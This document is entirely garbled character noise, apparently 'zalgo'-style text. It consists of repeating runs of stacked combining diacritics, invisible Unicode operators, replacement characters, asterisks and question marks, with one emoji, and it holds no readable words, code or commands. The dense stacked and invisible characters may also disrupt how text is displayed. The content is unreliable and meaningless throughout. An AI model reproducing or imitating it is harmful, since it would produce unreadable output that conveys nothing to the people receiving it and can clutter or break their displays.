̯̱̪͍͉̟͋̈́̉͗̈́́͒͟⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̝̮̬̺̳̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡